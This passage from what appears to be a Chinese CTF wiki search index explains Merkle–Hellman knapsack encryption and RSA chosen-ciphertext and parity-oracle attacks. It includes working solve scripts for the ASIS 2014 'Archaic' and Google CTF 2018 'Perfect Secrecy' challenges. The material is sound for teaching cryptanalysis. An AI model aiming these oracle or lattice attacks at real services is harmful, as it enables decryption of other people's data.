\u4f4d\u4e8c\u8fdb\u5236\u6570\uff0c\u7136\u540e\u5206\u522b\u4e58\u4e0a a_i a_i \u5373\u53ef\u5f97\u5230\u52a0\u5bc6\u7ed3\u679c\u3002 \u4f46\u662f\u89e3\u5bc6\u7684\u65f6\u5019\uff0c\u8be5\u600e\u4e48\u529e\u5462\uff1f\u6211\u4eec\u786e\u5b9e\u8ba9\u5176\u4ed6\u4eba\u96be\u4ee5\u89e3\u5bc6\u5bc6\u6587\uff0c\u4f46\u662f\u6211\u4eec\u81ea\u5df1\u4e5f\u786e\u5b9e\u6ca1\u6709\u529e\u6cd5\u89e3\u5bc6\u5bc6\u6587\u3002 \u4f46\u662f\u5f53 a_i a_i \u662f\u8d85\u9012\u589e\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u6709\u529e\u6cd5\u89e3\u4e86\uff0c\u6240\u8c13\u8d85\u9012\u589e\u662f\u6307\u5e8f\u5217\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6 a_i>\\sum_{k=1}^{i-1}a_k a_i>\\sum_{k=1}^{i-1}a_k \u5373\u7b2c i \u4e2a\u6570\u5927\u4e8e\u524d\u9762\u6240\u6709\u6570\u7684\u548c\u3002 \u4e3a\u4ec0\u4e48\u6ee1\u8db3\u8fd9\u6837\u7684\u6761\u4ef6\u5c31\u53ef\u4ee5\u89e3\u5bc6\u4e86\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u5982\u679c\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u5927\u4e8e a_n a_n \u7684\u8bdd\uff0c\u5176\u524d\u9762\u7684\u7cfb\u6570\u4e3a\u5fc5\u987b 1 \u7684\u3002\u53cd\u4e4b\uff0c\u65e0\u8bba\u5982\u4f55\u4e5f\u65e0\u6cd5\u4f7f\u5f97\u7b49\u5f0f\u6210\u7acb\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u7acb\u9a6c\u5f97\u5230\u5bf9\u5e94\u7684\u660e\u6587\u3002 \u4f46\u662f\uff0c\u8fd9\u6837\u53c8\u51fa\u73b0\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c\u7531\u4e8e a_i a_i \u662f\u516c\u5f00\u7684\uff0c\u5982\u679c\u653b\u51fb\u8005\u622a\u83b7\u4e86\u5bc6\u6587\uff0c\u90a3\u4e48\u5b83\u4e5f\u5c31\u5f88\u5bb9\u6613\u53bb\u7834\u89e3\u8fd9\u6837\u7684\u5bc6\u7801\u3002\u4e3a\u4e86\u5f25\u8865\u8fd9\u6837\u7684\u95ee\u9898\uff0c\u5c31\u51fa\u73b0\u4e86 Merkle\u2013Hellman \u8fd9\u6837\u7684\u52a0\u5bc6\u7b97\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u521d\u59cb\u7684\u80cc\u5305\u96c6\u4f5c\u4e3a\u79c1\u94a5\uff0c\u53d8\u6362\u540e\u7684\u80cc\u5305\u96c6\u4f5c\u4e3a\u516c\u94a5\uff0c\u518d\u7a0d\u5fae\u6539\u52a8\u52a0\u5bc6\u8fc7\u7a0b\uff0c\u5373\u53ef\u3002 \u8fd9\u91cc\u867d\u7136\u8bf4\u4e86\u8d85\u9012\u589e\u5e8f\u5217\uff0c\u4f46\u662f\u5374\u6ca1\u6709\u8bf4\u662f\u5982\u4f55\u751f\u6210\u7684\u3002","title":"\u80cc\u5305\u95ee\u9898"},{"location":"crypto/asymmetric/knapsack/knapsack/#merklehellman","text":"","title":"Merkle\u2013Hellman"},{"location":"crypto/asymmetric/knapsack/knapsack/#_2","text":"","title":"\u516c\u79c1\u94a5\u751f\u6210"},{"location":"crypto/asymmetric/knapsack/knapsack/#_3","text":"\u79c1\u94a5\u5c31\u662f\u6211\u4eec\u7684\u521d\u59cb\u7684\u80cc\u5305\u96c6\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u8d85\u9012\u589e\u5e8f\u5217\uff0c\u600e\u4e48\u751f\u6210\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u5047\u8bbe a_1=1 a_1=1 \uff0c\u90a3\u4e48 a_2 a_2 \u5927\u4e8e 1 \u5373\u53ef\uff0c\u7c7b\u4f3c\u7684\u53ef\u4ee5\u4f9d\u6b21\u751f\u6210\u540e\u9762\u7684\u503c\u3002","title":"\u751f\u6210\u79c1\u94a5"},{"location":"crypto/asymmetric/knapsack/knapsack/#_4","text":"\u5728\u751f\u6210\u516c\u94a5\u7684\u8fc7\u7a0b\u4e2d\u4e3b\u8981\u4f7f\u7528\u4e86\u6a21\u4e58\u7684\u8fd0\u7b97\u3002 \u9996\u5148\uff0c\u6211\u4eec\u751f\u6210\u6a21\u4e58\u7684\u6a21\u6570 m\uff0c\u8fd9\u91cc\u8981\u786e\u4fdd m>\\sum_{i=1}^{i=n}a_i m>\\sum_{i=1}^{i=n}a_i \u5176\u6b21\uff0c\u6211\u4eec\u9009\u62e9\u6a21\u4e58\u7684\u4e58\u6570 w\uff0c\u4f5c\u4e3a\u79c1\u94a5\u5e76\u4e14\u786e\u4fdd gcd(w,m)=1 gcd(w,m)=1 \u4e4b\u540e\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u516c\u5f0f\u751f\u6210\u516c\u94a5 b_i \\equiv w a_i \\bmod m b_i \\equiv w a_i \\bmod m \u5e76\u5c06\u8fd9\u4e2a\u65b0\u7684\u80cc\u5305\u96c6 b_i b_i \u548c m \u4f5c\u4e3a\u516c\u94a5\u3002","title":"\u751f\u6210\u516c\u94a5"},{"location":"crypto/asymmetric/knapsack/knapsack/#_5","text":"","title":"\u52a0\u89e3\u5bc6"},{"location":"crypto/asymmetric/knapsack/knapsack/#_6","text":"\u5047\u8bbe\u6211\u4eec\u8981\u52a0\u5bc6\u7684\u660e\u6587\u4e3a v\uff0c\u5176\u6bcf\u4e00\u4e2a\u6bd4\u7279\u4f4d\u4e3a v_i v_i \uff0c\u90a3\u4e48\u6211\u4eec\u52a0\u5bc6\u7684\u7ed3\u679c\u4e3a \\sum_{i=1}^{i=n}b_iv_i \\bmod m \\sum_{i=1}^{i=n}b_iv_i \\bmod m","title":"\u52a0\u5bc6"},{"location":"crypto/asymmetric/knapsack/knapsack/#_7","text":"\u5bf9\u4e8e\u89e3\u5bc6\u65b9\uff0c\u9996\u5148\u53ef\u4ee5\u6c42\u7684 w \u5173\u4e8e m \u7684\u9006\u5143 w^{-1} w^{-1} \u3002 \u7136\u540e\u6211\u4eec\u53ef\u4ee5\u5c06\u5f97\u5230\u7684\u5bc6\u6587\u4e58\u4ee5 w^{-1} w^{-1} \u5373\u53ef\u5f97\u5230\u660e\u6587\uff0c\u8fd9\u662f\u56e0\u4e3a \\sum_{i=1}^{i=n}w^{-1}b_iv_i \\bmod m=\\sum_{i=1}^{i=n}a_iv_i \\bmod m \\sum_{i=1}^{i=n}w^{-1}b_iv_i \\bmod m=\\sum_{i=1}^{i=n}a_iv_i \\bmod m \u8fd9\u91cc\u6709 b_i \\equiv w a_i \\bmod m b_i \\equiv w a_i \\bmod m \u5bf9\u4e8e\u6bcf\u4e00\u5757\u7684\u52a0\u5bc6\u7684\u6d88\u606f\u90fd\u662f\u5c0f\u4e8e m \u7684\uff0c\u6240\u4ee5\u6c42\u5f97\u7ed3\u679c\u81ea\u7136\u4e5f\u5c31\u662f\u660e\u6587\u4e86\u3002","title":"\u89e3\u5bc6"},{"location":"crypto/asymmetric/knapsack/knapsack/#_8","text":"\u8be5\u52a0\u5bc6\u4f53\u5236\u5728\u63d0\u51fa\u540e\u4e24\u5e74\u540e\u8be5\u4f53\u5236\u5373\u88ab\u7834\u8bd1\uff0c\u7834\u8bd1\u7684\u57fa\u672c\u601d\u60f3\u662f\u6211\u4eec\u4e0d\u4e00\u5b9a\u8981\u627e\u51fa\u6b63\u786e\u7684\u4e58\u6570 w\uff08\u5373\u9677\u95e8\u4fe1\u606f\uff09\uff0c\u53ea\u9700\u627e\u51fa\u4efb\u610f\u6a21\u6570 m\u2032 \u548c\u4e58\u6570 w\u2032 \uff0c\u53ea\u8981\u4f7f\u7528 w\u2032 \u53bb\u4e58\u516c\u5f00\u7684\u80cc\u5305\u5411\u91cf B \u65f6\uff0c\u80fd\u591f\u4ea7\u751f\u8d85\u9012\u589e\u7684\u80cc\u5305\u5411\u91cf\u5373\u53ef\u3002","title":"\u7834\u89e3"},{"location":"crypto/asymmetric/knapsack/knapsack/#_9","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 2014 \u5e74 ASIS Cyber Security Contest Quals \u4e2d\u7684 Archaic \u4e3a\u4f8b\uff0c \u9898\u76ee\u94fe\u63a5 \u3002 \u9996\u5148\u67e5\u770b\u6e90\u7a0b\u5e8f secret = 'CENSORED' msg_bit = bin ( int ( secret . encode ( 'hex' ), 16 ))[ 2 :] \u9996\u5148\u5f97\u5230\u4e86 secret \u7684\u6240\u6709\u4e8c\u8fdb\u5236\u4f4d\u3002 \u5176\u6b21\uff0c\u5229\u7528\u5982\u4e0b\u51fd\u6570\u5f97\u5230 keypair\uff0c\u5305\u542b\u516c\u94a5\u4e0e\u79c1\u94a5\u3002 keyPair = makeKey ( len ( msg_bit )) \u4ed4\u7ec6\u5206\u6790 makekey \u51fd\u6570\uff0c\u5982\u4e0b def makeKey ( n ): privKey = [ random . randint ( 1 , 4 ** n )] s = privKey [ 0 ] for i in range ( 1 , n ): privKey . append ( random . randint ( s + 1 , 4 ** ( n + i ))) s += privKey [ i ] q = random . randint ( privKey [ n - 1 ] + 1 , 2 * privKey [ n - 1 ]) r = random . randint ( 1 , q ) while gmpy2 . gcd ( r , q ) != 1 : r = random . randint ( 1 , q ) pubKey = [ r * w % q for w in privKey ] return privKey , q , r , pubKey \u53ef\u4ee5\u770b\u51fa prikey \u662f\u4e00\u4e2a\u8d85\u9012\u589e\u5e8f\u5217\uff0c\u5e76\u4e14\u5f97\u5230\u7684 q \u6bd4 prikey \u4e2d\u6240\u6709\u6570\u7684\u548c\u8fd8\u8981\u5927\uff0c\u6b64\u5916\u6211\u4eec\u5f97\u5230\u7684 r\uff0c\u6070\u597d\u4e0e q \u4e92\u7d20\uff0c\u8fd9\u4e00\u5207\u90fd\u8868\u660e\u4e86\u8be5\u52a0\u5bc6\u662f\u4e00\u4e2a\u80cc\u5305\u52a0\u5bc6\u3002 \u679c\u7136\u52a0\u5bc6\u51fd\u6570\u5c31\u662f\u5bf9\u4e8e\u6d88\u606f\u7684\u6bcf\u4e00\u4f4d\u4e58\u4ee5\u5bf9\u5e94\u7684\u516c\u94a5\u5e76\u6c42\u548c\u3002 def encrypt ( msg , pubKey ): msg_bit = msg n = len ( pubKey ) cipher = 0 i = 0 for bit in msg_bit : cipher += int ( bit ) * pubKey [ i ] i += 1 return bin ( cipher )[ 2 :] \u5bf9\u4e8e\u7834\u89e3\u7684\u811a\u672c\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 GitHub \u4e0a\u7684\u811a\u672c\u3002\u8fdb\u884c\u4e00\u4e9b\u7b80\u5355\u7684\u4fee\u6539\u3002 import binascii # open the public key and strip the spaces so we have a decent array fileKey = open ( \"pub.Key\" , 'rb' ) pubKey = fileKey . read () . replace ( ' ' , '' ) . replace ( 'L' , '' ) . strip ( '[]' ) . split ( ',' ) nbit = len ( pubKey ) # open the encoded message fileEnc = open ( \"enc.txt\" , 'rb' ) encoded = fileEnc . read () . replace ( 'L' , '' ) print \"start\" # create a large matrix of 0's (dimensions are public key length +1) A = Matrix ( ZZ , nbit + 1 , nbit + 1 ) # fill in the identity matrix for i in xrange ( nbit ): A [ i , i ] = 1 # replace the bottom row with your public key for i in xrange ( nbit ): A [ i , nbit ] = pubKey [ i ] # last element is the encoded message A [ nbit , nbit ] = - int ( encoded ) res = A . LLL () for i in range ( 0 , nbit + 1 ): # print solution M = res . row ( i ) . list () flag = True for m in M : if m != 0 and m != 1 : flag = False break if flag : print i , M M = '' . join ( str ( j ) for j in M ) # remove the last bit M = M [: - 1 ] M = hex ( int ( M , 2 ))[ 2 : - 1 ] print M \u8f93\u51fa\u4e4b\u540e\u518d\u89e3\u7801\u4e0b 295 [ 1 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 ] 415349535 f3962643364356664323432323638326331393536383830366130373036316365 >>> import binascii >>> binascii . unhexlify ( '415349535f3962643364356664323432323638326331393536383830366130373036316365' ) 'ASIS_9bd3d5fd2422682c19568806a07061ce' \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u5f97\u5230\u7684 LLL \u653b\u51fb\u5f97\u5230\u7684\u77e9\u9635 res \u7684\u53ea\u5305\u542b 01 \u503c\u7684\u884c\u624d\u662f\u6211\u4eec\u60f3\u8981\u7684\u7ed3\u679c\uff0c\u56e0\u4e3a\u6211\u4eec\u5bf9\u4e8e\u660e\u6587\u52a0\u5bc6\u65f6\uff0c\u4f1a\u5c06\u5176\u5206\u89e3\u4e3a\u4e8c\u8fdb\u5236\u6bd4\u7279\u4e32\u3002\u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u53bb\u6389\u5bf9\u5e94\u54ea\u4e00\u884c\u7684\u6700\u540e\u4e00\u4e2a\u6570\u5b57\u3002 flag \u662f ASIS_9bd3d5fd2422682c19568806a07061ce \u3002","title":"\u4f8b\u5b50"},{"location":"crypto/asymmetric/knapsack/knapsack/#_10","text":"2017 \u56fd\u8d5b classic","title":"\u9898\u76ee"},{"location":"crypto/asymmetric/rsa/rsa_chosen_cipher/","text":"RSA \u9009\u62e9\u5bc6\u6587\u653b\u51fb \u00b6 \u4efb\u610f\u5bc6\u6587\u89e3\u5bc6 \u00b6 \u5047\u8bbe\u7231\u4e3d\u4e1d\u521b\u5efa\u4e86\u5bc6\u6587 C = P^e \\bmod n C = P^e \\bmod n \u5e76\u4e14\u628a C \u53d1\u9001\u7ed9\u9c8d\u52c3\uff0c\u540c\u65f6\u5047\u8bbe\u6211\u4eec\u8981\u5bf9\u7231\u4e3d\u4e1d\u52a0\u5bc6\u540e\u7684\u4efb\u610f\u5bc6\u6587\u89e3\u5bc6\uff0c\u800c\u4e0d\u662f\u53ea\u89e3\u5bc6 C\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u62e6\u622a C\uff0c\u5e76\u8fd0\u7528\u4e0b\u5217\u6b65\u9aa4\u6c42\u51fa P\uff1a \u9009\u62e9\u4efb\u610f\u7684 X\\in Z_n^{*} X\\in Z_n^{*} \uff0c\u5373 X \u4e0e N \u4e92\u7d20 \u8ba1\u7b97 Y=C \\times X^e \\bmod n Y=C \\times X^e \\bmod n \u7531\u4e8e\u6211\u4eec\u53ef\u4ee5\u8fdb\u884c\u9009\u62e9\u5bc6\u6587\u653b\u51fb\uff0c\u90a3\u4e48\u6211\u4eec\u6c42\u5f97 Y \u5bf9\u5e94\u7684\u89e3\u5bc6\u7ed3\u679c Z=Y^d Z=Y^d \u90a3\u4e48\uff0c\u7531\u4e8e Z=Y^d=(C \\times X^e)^d=C^d X=P^{ed} X= P X\\bmod n Z=Y^d=(C \\times X^e)^d=C^d X=P^{ed} X= P X\\bmod n \uff0c\u7531\u4e8e X \u4e0e N \u4e92\u7d20\uff0c\u6211\u4eec\u5f88\u5bb9\u6613\u6c42\u5f97\u76f8\u5e94\u7684\u9006\u5143\uff0c\u8fdb\u800c\u53ef\u4ee5\u5f97\u5230 P RSA parity oracle \u00b6 \u539f\u7406 \u00b6 \u5047\u8bbe\u76ee\u524d\u5b58\u5728\u4e00\u4e2a Oracle\uff0c\u5b83\u4f1a\u5bf9\u4e00\u4e2a\u7ed9\u5b9a\u7684\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\uff0c\u5e76\u4e14\u4f1a\u68c0\u67e5\u89e3\u5bc6\u7684\u660e\u6587\u7684\u5947\u5076\u6027\uff0c\u5e76\u6839\u636e\u5947\u5076\u6027\u8fd4\u56de\u76f8\u5e94\u7684\u503c\uff0c\u6bd4\u5982 1 \u8868\u793a\u5947\u6570\uff0c0 \u8868\u793a\u5076\u6570\u3002\u90a3\u4e48\u7ed9\u5b9a\u4e00\u4e2a\u52a0\u5bc6\u540e\u7684\u5bc6\u6587\uff0c\u6211\u4eec\u53ea\u9700\u8981 log(N) \u6b21\u5c31\u53ef\u4ee5\u77e5\u9053\u8fd9\u4e2a\u5bc6\u6587\u5bf9\u5e94\u7684\u660e\u6587\u6d88\u606f\uff0c\u539f\u7406\u5982\u4e0b \u5047\u8bbe C=P^e \\bmod N C=P^e \\bmod N \u7b2c\u4e00\u6b21\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u7ed9\u670d\u52a1\u5668\u53d1\u9001 C*2^e=(2P)^e \\bmod N C*2^e=(2P)^e \\bmod N \u670d\u52a1\u5668\u4f1a\u8ba1\u7b97\u5f97\u5230 2P \\bmod N 2P \\bmod N \u8fd9\u91cc 2P \u662f\u5076\u6570\uff0c\u5b83\u7684\u5e42\u6b21\u4e5f\u662f\u5076\u6570\u3002 N \u662f\u5947\u6570\uff0c\u56e0\u4e3a\u5b83\u662f\u7531\u4e24\u4e2a\u5927\u7d20\u6570\u76f8\u4e58\u5f97\u5230\u3002 \u90a3\u4e48 \u670d\u52a1\u5668\u8fd4\u56de\u5947\u6570\uff0c\u5373 2P \\bmod N 2P \\bmod N \u4e3a\u5947\u6570\uff0c\u5219\u8bf4\u660e 2P \u5927\u4e8e N\uff0c\u4e14\u51cf\u53bb\u4e86\u5947\u6570\u4e2a N\uff0c\u53c8\u56e0\u4e3a 2P<2N 2P<2N \uff0c\u56e0\u6b64\u51cf\u53bb\u4e86\u4e00\u4e2aN\uff0c \u5373 \\frac{N}{2} \\leq P < N \\frac{N}{2} \\leq P < N \uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u8003\u8651\u5411\u4e0b\u53d6\u6574\u3002 \u670d\u52a1\u5668\u8fd4\u56de\u5076\u6570\uff0c\u5219\u8bf4\u660e 2P \u5c0f\u4e8e N\u3002\u5373 0\\leq P < \\frac{N}{2} 0\\leq P < \\frac{N}{2} \uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u5411\u4e0b\u53d6\u6574\u3002 \u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u6570\u5b66\u5f52\u7eb3\u6cd5\uff0c\u5373\u5047\u8bbe\u5728\u7b2c i \u6b21\u65f6\uff0c \\frac{xN}{2^{i}} \\leq P < \\frac{xN+N}{2^{i}} \\frac{xN}{2^{i}} \\leq P < \\frac{xN+N}{2^{i}} \u8fdb\u4e00\u6b65\uff0c\u5728\u7b2c i+1 \u6b21\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u9001 C*2^{(i+1)e} C*2^{(i+1)e} \u670d\u52a1\u5668\u4f1a\u8ba1\u7b97\u5f97\u5230 2^{i+1}P \\bmod N=2^{i+1}P-kN 2^{i+1}P \\bmod N=2^{i+1}P-kN 0 \\leq 2^{i+1}P-kN<N 0 \\leq 2^{i+1}P-kN<N \\frac{kN}{2^{i+1}} \\leq P < \\frac{kN+N}{2^{i+1}} \\frac{kN}{2^{i+1}} \\leq P < \\frac{kN+N}{2^{i+1}} \u6839\u636e\u7b2c i \u6b21\u7684\u7ed3\u679c \\frac{2xN}{2^{i+1}} \\leq P < \\frac{2xN+2N}{2^{i+1}} \\frac{2xN}{2^{i+1}} \\leq P < \\frac{2xN+2N}{2^{i+1}} \u90a3\u4e48 \u670d\u52a1\u5668\u8fd4\u56de\u5947\u6570\uff0c\u5219 k \u5fc5\u7136\u662f\u4e00\u4e2a\u5947\u6570\uff0ck=2y+1\uff0c \u90a3\u4e48 \\frac{2yN+N}{2^{i+1}} \\leq P < \\frac{2yN+2N}{2^{i+1}} \\frac{2yN+N}{2^{i+1}} \\leq P < \\frac{2yN+2N}{2^{i+1}} \u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u7531\u4e8e P \u5fc5\u7136\u5b58\u5728\uff0c\u6240\u4ee5\u7b2c i+1 \u5f97\u5230\u7684\u8fd9\u4e2a\u8303\u56f4\u548c\u7b2c i \u6b21\u5f97\u5230\u7684\u8303\u56f4\u5fc5\u7136\u5b58\u5728\u4ea4\u96c6\u3002\u6240\u4ee5 y \u5fc5\u7136\u4e0e x \u76f8\u7b49\u3002 \u670d\u52a1\u5668\u8fd4\u56de\u5076\u6570\uff0c\u5219 k \u5fc5\u7136\u662f\u4e00\u4e2a\u5076\u6570\uff0ck=2y\uff0c\u6b64\u65f6 y \u5fc5\u7136\u4e5f\u4e0e x \u76f8\u7b49\uff0c\u90a3\u4e48 \\frac{2xN}{2^{i+1}} \\leq P < \\frac{2xN+N}{2^{i+1}} \\frac{2xN}{2^{i+1}} \\leq P < \\frac{2xN+N}{2^{i+1}} \u8fdb\u4e00\u6b65\u6211\u4eec\u53ef\u4ee5\u8fd9\u4e48\u5f52\u7eb3 lb = 0 ub = N if server returns 1 lb = ( lb + ub ) / 2 else : ub = ( lb + ub ) / 2 \u8fd9\u91cc\u867d\u7136\u662f\u6574\u9664\uff0c \u5373\u4e0b\u53d6\u6574\uff0c\u4f46\u662f\u65e0\u6240\u8c13\u6211\u4eec\u5728\u6700\u521d\u65f6\u5df2\u7ecf\u5206\u6790\u4e86\u8fd9\u4e2a\u95ee\u9898\u3002 2018 Google CTF Perfect Secrecy \u00b6 \u8fd9\u91cc\u4ee5 2018 \u5e74 Google CTF \u7684\u9898\u76ee\u4e3a\u4f8b\u8fdb\u884c\u5206\u6790 #!/usr/bin/env python3 import sys import random from cryptography.hazmat.primitives import serialization from cryptography.hazmat.backends import default_backend def ReadPrivateKey ( filename ): return serialization . load_pem_private_key ( open ( filename , 'rb' ) . read (), password = None , backend = default_backend ()) def RsaDecrypt ( private_key , ciphertext ): assert ( len ( ciphertext ) <= ( private_key . public_key () . key_size // 8 )), 'Ciphertext too large' return pow ( int . from_bytes ( ciphertext , 'big' ), private_key . private_numbers () . d , private_key . public_key () . public_numbers () . n ) def Challenge ( private_key , reader , writer ): try : m0 = reader . read ( 1 ) m1 = reader . read ( 1 ) ciphertext = reader . read ( private_key . public_key () . key_size // 8 ) dice = RsaDecrypt ( private_key , ciphertext ) for rounds in range ( 100 ): p = [ m0 , m1 ][ dice & 1 ] k = random . randint ( 0 , 2 ) c = ( ord ( p ) + k ) % 2 writer . write ( bytes (( c ,))) writer . flush () return 0 except Exception as e : return 1 def main (): private_key = ReadPrivateKey ( sys . argv [ 1 ]) return Challenge ( private_key , sys . stdin . buffer , sys . stdout . buffer ) if __name__ == '__main__' : sys . exit ( main ()) \u53ef\u4ee5\u770b\u51fa \u6211\u4eec\u53ef\u4ee5\u7ed9\u670d\u52a1\u5668\u4e24\u4e2a\u6570\uff0c\u670d\u52a1\u5668\u4f1a\u6839\u636e\u89e3\u5bc6\u540e\u7684\u5bc6\u6587\u5185\u5bb9\u6765\u51b3\u5b9a\u4f7f\u7528\u54ea\u4e00\u4e2a\u3002 \u670d\u52a1\u5668\u4f1a\u4f7f\u7528 random.randint(0, 2) \u6765\u751f\u6210\u968f\u673a\u6570\uff0c\u5e76\u8f93\u51fa\u76f8\u5173\u7684\u968f\u673a 01 \u5b57\u8282 c\u3002 \u4e4d\u4e00\u770b\uff0c\u4f3c\u4e4e\u662f\u5b8c\u5168\u968f\u673a\u7684\uff0c\u4ed4\u7ec6\u67e5\u4e00\u4e0b random.randint(0, 2) \u53ef\u4ee5\u77e5\u9053\u5176\u751f\u6210\u968f\u673a\u6570\u662f\u5305\u62ec\u8fb9\u754c\u7684\uff0c\u56e0\u6b64\u5176\u751f\u6210\u5076\u6570\u7684\u6982\u7387\u5927\u4e8e\u751f\u6210\u5947\u6570\u7684\u6982\u7387\uff0c\u90a3\u4e48 c \u4e0e p \u540c\u5947\u5076\u7684\u6982\u7387\u4e3a \u2154\u3002\u8fdb\u800c\u6211\u4eec\u901a\u8fc7\u8bbe\u7f6e m0 \u548c m1 \u5c31\u53ef\u4ee5\u77e5\u9053\u89e3\u5bc6\u540e\u7684\u5bc6\u6587\u7684\u6700\u540e\u4e00\u4f4d\u662f 0 \u8fd8\u662f 1 \u3002\u8fd9\u5176\u5b9e\u5c31\u662f RSA parity oracle\u3002 exp \u5982\u4e0b import gmpy2 from pwn import * encflag = open ( './flag.txt' ) . read () encflag = encflag . encode ( 'hex' ) encflag = int ( encflag , 16 ) #context.log_level = 'debug' m = [ ' \\x00 ' , ' \\x07 ' ] n = 0xDA53A899D5573091AF6CC9C9A9FC315F76402C8970BBB1986BFE8E29CED12D0ADF61B21D6C281CCBF2EFED79AA7DD23A2776B03503B1AF354E35BF58C91DB7D7C62F6B92C918C90B68859C77CAE9FDB314F82490A0D6B50C5DC85F5C92A6FDF19716AC8451EFE8BBDF488AE098A7C76ADD2599F2CA642073AFA20D143AF403D1 e = 65537 flag = \"\" def guessvalue ( cnt ): if cnt [ 0 ] > cnt [ 1 ]: return 0 return 1 i = 0 while True : cnt = dict () cnt [ 0 ] = cnt [ 1 ] = 0 p = remote ( 'perfect-secrecy.ctfcompetition.com' , 1337 ) p . send ( m [ 0 ]) p . send ( m [ 1 ]) tmp = pow ( 2 , i ) two_inv = gmpy2 . invert ( tmp , n ) two_cipher = gmpy2 . powmod ( two_inv , e , n ) tmp = encflag * two_cipher % n tmp = hex ( tmp )[ 2 :] . strip ( 'L' ) tmp = '0' * ( 256 - len ( tmp )) + tmp tmp = tmp . decode ( 'hex' ) assert ( len ( tmp ) == 128 ) p . send ( tmp ) #print tmp data = \"\" while ( len ( data ) != 100 ): data += p . recv () for c in data : cnt [ u8 ( c )] += 1 p . close () flag = str ( guessvalue ( cnt )) + flag print i , flag i += 1 \u7ed3\u679c\u5982\u4e0bu89e3\u7801\u540e\u5c31\u53ef\u4ee5\u5f97\u5230 flag CTF { h3ll0__17_5_m3_1_w45_w0nd3r1n6_1f_4f73r_4ll_7h353_y34r5_y0u_d_l1k3_70_m337 } \u9898\u76ee \u00b6 2016 Plaid CTF rabit 2016 sharif CTF lsb-oracle-150 2018 Backdoor CTF BIT-LEAKER 2018 XMAN \u9009\u62d4\u8d5b baby RSA \u53c2\u8003 \u00b6 https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack","title":"\u9009\u62e9\u5bc6\u6587\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_chosen_cipher/#rsa","text":"","title":"RSA \u9009\u62e9\u5bc6\u6587\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_chosen_cipher/#_1","text":"\u5047\u8bbe\u7231\u4e3d\u4e1d\u521b\u5efa\u4e86\u5bc6\u6587 C = P^e \\bmod n C = P^e \\bmod n \u5e76\u4e14\u628a C \u53d1\u9001\u7ed9\u9c8d\u52c3\uff0c\u540c\u65f6\u5047\u8bbe\u6211\u4eec\u8981\u5bf9\u7231\u4e3d\u4e1d\u52a0\u5bc6\u540e\u7684\u4efb\u610f\u5bc6\u6587\u89e3\u5bc6\uff0c\u800c\u4e0d\u662f\u53ea\u89e3\u5bc6 C\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u62e6\u622a C\uff0c\u5e76\u8fd0\u7528\u4e0b\u5217\u6b65\u9aa4\u6c42\u51fa P\uff1a \u9009\u62e9\u4efb\u610f\u7684 X\\in Z_n^{*} X\\in Z_n^{*} \uff0c\u5373 X \u4e0e N \u4e92\u7d20 